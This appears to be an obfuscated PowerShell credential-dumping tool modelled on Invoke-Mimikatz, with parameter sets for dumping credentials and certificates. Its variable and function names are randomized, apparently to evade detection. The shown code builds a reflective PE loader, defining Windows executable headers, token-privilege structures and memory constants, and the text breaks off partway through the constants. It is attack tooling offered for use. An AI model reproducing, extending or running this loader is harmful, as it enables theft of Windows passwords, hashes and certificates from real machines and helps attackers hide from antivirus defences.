function makeshifts
{
[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$mTpmjJco99,
    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $qKXHZUgV99,
    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $bxvnNMtg99,
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)
Set-StrictMode -Version 2
$BXLTNCnx99 = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$emlwBouH99,
        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$onuItxvK99,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$czxFmLBM99,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$GOfrdYkU99,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$GNjOXyNt99,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $OOQlQQxw99
	)
	
	Function jeweling
	{
		$mVRcZsGx99 = New-Object System.Object
		$yJuceBLS99 = [AppDomain]::CurrentDomain
		$rkeCHMat99 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$hwpgYJcy99 = $yJuceBLS99.DefineDynamicAssembly($rkeCHMat99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$lwzdJyIc99 = $hwpgYJcy99.DefineDynamicModule('DynamicModule', $false)
		$UxXajDld99 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		$ErxUeQzY99 = $lwzdJyIc99.DefineEnum('MachineType', 'Public', [UInt16])
		$ErxUeQzY99.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$ErxUeQzY99.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$ErxUeQzY99.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$ErxUeQzY99.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$yZnzfNnW99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name MachineType -Value $yZnzfNnW99
		$ErxUeQzY99 = $lwzdJyIc99.DefineEnum('MagicType', 'Public', [UInt16])
		$ErxUeQzY99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$YopelZlI99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name MagicType -Value $YopelZlI99
		$ErxUeQzY99 = $lwzdJyIc99.DefineEnum('SubSystemType', 'Public', [UInt16])
		$ErxUeQzY99.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$tFGAMnoQ99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $tFGAMnoQ99
		$ErxUeQzY99 = $lwzdJyIc99.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$ErxUeQzY99.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$ErxUeQzY99.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$ErxUeQzY99.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$ErxUeQzY99.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$ErxUeQzY99.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$ErxUeQzY99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$onqCfdWo99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $onqCfdWo99
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('IMAGE_DATA_DIRECTORY', $johInCwg99, [System.ValueType], 8)
		($ErxUeQzY99.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($ErxUeQzY99.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$DuwwqdzN99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $DuwwqdzN99
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('IMAGE_FILE_HEADER', $johInCwg99, [System.ValueType], 20)
		$ErxUeQzY99.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$NDmtaOFf99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $NDmtaOFf99
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('IMAGE_OPTIONAL_HEADER64', $johInCwg99, [System.ValueType], 240)
		($ErxUeQzY99.DefineField('Magic', $YopelZlI99, 'Public')).SetOffset(0) | Out-Null
		($ErxUeQzY99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($ErxUeQzY99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($ErxUeQzY99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($ErxUeQzY99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($ErxUeQzY99.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($ErxUeQzY99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($ErxUeQzY99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($ErxUeQzY99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($ErxUeQzY99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($ErxUeQzY99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($ErxUeQzY99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($ErxUeQzY99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($ErxUeQzY99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($ErxUeQzY99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($ErxUeQzY99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($ErxUeQzY99.DefineField('Subsystem', $tFGAMnoQ99, 'Public')).SetOffset(68) | Out-Null
		($ErxUeQzY99.DefineField('DllCharacteristics', $onqCfdWo99, 'Public')).SetOffset(70) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($ErxUeQzY99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($ErxUeQzY99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($ErxUeQzY99.DefineField('ExportTable', $DuwwqdzN99, 'Public')).SetOffset(112) | Out-Null
		($ErxUeQzY99.DefineField('ImportTable', $DuwwqdzN99, 'Public')).SetOffset(120) | Out-Null
		($ErxUeQzY99.DefineField('ResourceTable', $DuwwqdzN99, 'Public')).SetOffset(128) | Out-Null
		($ErxUeQzY99.DefineField('ExceptionTable', $DuwwqdzN99, 'Public')).SetOffset(136) | Out-Null
		($ErxUeQzY99.DefineField('CertificateTable', $DuwwqdzN99, 'Public')).SetOffset(144) | Out-Null
		($ErxUeQzY99.DefineField('BaseRelocationTable', $DuwwqdzN99, 'Public')).SetOffset(152) | Out-Null
		($ErxUeQzY99.DefineField('Debug', $DuwwqdzN99, 'Public')).SetOffset(160) | Out-Null
		($ErxUeQzY99.DefineField('Architecture', $DuwwqdzN99, 'Public')).SetOffset(168) | Out-Null
		($ErxUeQzY99.DefineField('GlobalPtr', $DuwwqdzN99, 'Public')).SetOffset(176) | Out-Null
		($ErxUeQzY99.DefineField('TLSTable', $DuwwqdzN99, 'Public')).SetOffset(184) | Out-Null
		($ErxUeQzY99.DefineField('LoadConfigTable', $DuwwqdzN99, 'Public')).SetOffset(192) | Out-Null
		($ErxUeQzY99.DefineField('BoundImport', $DuwwqdzN99, 'Public')).SetOffset(200) | Out-Null
		($ErxUeQzY99.DefineField('IAT', $DuwwqdzN99, 'Public')).SetOffset(208) | Out-Null
		($ErxUeQzY99.DefineField('DelayImportDescriptor', $DuwwqdzN99, 'Public')).SetOffset(216) | Out-Null
		($ErxUeQzY99.DefineField('CLRRuntimeHeader', $DuwwqdzN99, 'Public')).SetOffset(224) | Out-Null
		($ErxUeQzY99.DefineField('Reserved', $DuwwqdzN99, 'Public')).SetOffset(232) | Out-Null
		$MUxUVJCB99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $MUxUVJCB99
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('IMAGE_OPTIONAL_HEADER32', $johInCwg99, [System.ValueType], 224)
		($ErxUeQzY99.DefineField('Magic', $YopelZlI99, 'Public')).SetOffset(0) | Out-Null
		($ErxUeQzY99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($ErxUeQzY99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($ErxUeQzY99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($ErxUeQzY99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($ErxUeQzY99.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($ErxUeQzY99.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($ErxUeQzY99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($ErxUeQzY99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($ErxUeQzY99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($ErxUeQzY99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($ErxUeQzY99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($ErxUeQzY99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($ErxUeQzY99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($ErxUeQzY99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($ErxUeQzY99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($ErxUeQzY99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($ErxUeQzY99.DefineField('Subsystem', $tFGAMnoQ99, 'Public')).SetOffset(68) | Out-Null
		($ErxUeQzY99.DefineField('DllCharacteristics', $onqCfdWo99, 'Public')).SetOffset(70) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($ErxUeQzY99.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($ErxUeQzY99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($ErxUeQzY99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($ErxUeQzY99.DefineField('ExportTable', $DuwwqdzN99, 'Public')).SetOffset(96) | Out-Null
		($ErxUeQzY99.DefineField('ImportTable', $DuwwqdzN99, 'Public')).SetOffset(104) | Out-Null
		($ErxUeQzY99.DefineField('ResourceTable', $DuwwqdzN99, 'Public')).SetOffset(112) | Out-Null
		($ErxUeQzY99.DefineField('ExceptionTable', $DuwwqdzN99, 'Public')).SetOffset(120) | Out-Null
		($ErxUeQzY99.DefineField('CertificateTable', $DuwwqdzN99, 'Public')).SetOffset(128) | Out-Null
		($ErxUeQzY99.DefineField('BaseRelocationTable', $DuwwqdzN99, 'Public')).SetOffset(136) | Out-Null
		($ErxUeQzY99.DefineField('Debug', $DuwwqdzN99, 'Public')).SetOffset(144) | Out-Null
		($ErxUeQzY99.DefineField('Architecture', $DuwwqdzN99, 'Public')).SetOffset(152) | Out-Null
		($ErxUeQzY99.DefineField('GlobalPtr', $DuwwqdzN99, 'Public')).SetOffset(160) | Out-Null
		($ErxUeQzY99.DefineField('TLSTable', $DuwwqdzN99, 'Public')).SetOffset(168) | Out-Null
		($ErxUeQzY99.DefineField('LoadConfigTable', $DuwwqdzN99, 'Public')).SetOffset(176) | Out-Null
		($ErxUeQzY99.DefineField('BoundImport', $DuwwqdzN99, 'Public')).SetOffset(184) | Out-Null
		($ErxUeQzY99.DefineField('IAT', $DuwwqdzN99, 'Public')).SetOffset(192) | Out-Null
		($ErxUeQzY99.DefineField('DelayImportDescriptor', $DuwwqdzN99, 'Public')).SetOffset(200) | Out-Null
		($ErxUeQzY99.DefineField('CLRRuntimeHeader', $DuwwqdzN99, 'Public')).SetOffset(208) | Out-Null
		($ErxUeQzY99.DefineField('Reserved', $DuwwqdzN99, 'Public')).SetOffset(216) | Out-Null
		$BjprekPa99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $BjprekPa99
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('IMAGE_NT_HEADERS64', $johInCwg99, [System.ValueType], 264)
		$ErxUeQzY99.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('FileHeader', $NDmtaOFf99, 'Public') | Out-Null
		$ErxUeQzY99.DefineField('OptionalHeader', $MUxUVJCB99, 'Public') | Out-Null
		$kAjrZntV99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $kAjrZntV99
		
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('IMAGE_NT_HEADERS32', $johInCwg99, [System.ValueType], 248)
		$ErxUeQzY99.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('FileHeader', $NDmtaOFf99, 'Public') | Out-Null
		$ErxUeQzY99.DefineField('OptionalHeader', $BjprekPa99, 'Public') | Out-Null
		$yieUIfvc99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $yieUIfvc99
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('IMAGE_DOS_HEADER', $johInCwg99, [System.ValueType], 64)
		$ErxUeQzY99.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
		$xYRbQLeo99 = $ErxUeQzY99.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$zmGYZulO99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FHjkFZdK99 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$JtHMpAbr99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($UxXajDld99, $zmGYZulO99, $FHjkFZdK99, @([Int32] 4))
		$xYRbQLeo99.SetCustomAttribute($JtHMpAbr99)
		$ErxUeQzY99.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
		$UlUaACwb99 = $ErxUeQzY99.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$zmGYZulO99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$JtHMpAbr99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($UxXajDld99, $zmGYZulO99, $FHjkFZdK99, @([Int32] 10))
		$UlUaACwb99.SetCustomAttribute($JtHMpAbr99)
		$ErxUeQzY99.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$QgPBhivJ99 = $ErxUeQzY99.CreateType()	
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $QgPBhivJ99
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('IMAGE_SECTION_HEADER', $johInCwg99, [System.ValueType], 40)
		$UcmiDneW99 = $ErxUeQzY99.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$zmGYZulO99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$JtHMpAbr99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($UxXajDld99, $zmGYZulO99, $FHjkFZdK99, @([Int32] 8))
		$UcmiDneW99.SetCustomAttribute($JtHMpAbr99)
		$ErxUeQzY99.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$fENsPlYC99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $fENsPlYC99
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('IMAGE_BASE_RELOCATION', $johInCwg99, [System.ValueType], 8)
		$ErxUeQzY99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$yYzCNTVP99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $yYzCNTVP99
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('IMAGE_IMPORT_DESCRIPTOR', $johInCwg99, [System.ValueType], 20)
		$ErxUeQzY99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('Name', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$eeyLdQmQ99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $eeyLdQmQ99
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('IMAGE_EXPORT_DIRECTORY', $johInCwg99, [System.ValueType], 40)
		$ErxUeQzY99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('Name', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('Base', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$HJzhziqw99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $HJzhziqw99
		
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('LUID', $johInCwg99, [System.ValueType], 8)
		$ErxUeQzY99.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('LUID_AND_ATTRIBUTES', $johInCwg99, [System.ValueType], 12)
		$ErxUeQzY99.DefineField('Luid', $LUID, 'Public') | Out-Null
		$ErxUeQzY99.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$tUdZShfY99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $tUdZShfY99
		
		$johInCwg99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$ErxUeQzY99 = $lwzdJyIc99.DefineType('TOKEN_PRIVILEGES', $johInCwg99, [System.ValueType], 16)
		$ErxUeQzY99.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$ErxUeQzY99.DefineField('Privileges', $tUdZShfY99, 'Public') | Out-Null
		$qjBTIdBz99 = $ErxUeQzY99.CreateType()
		$mVRcZsGx99 | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $qjBTIdBz99
		return $mVRcZsGx99
	}
	Function enslave
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
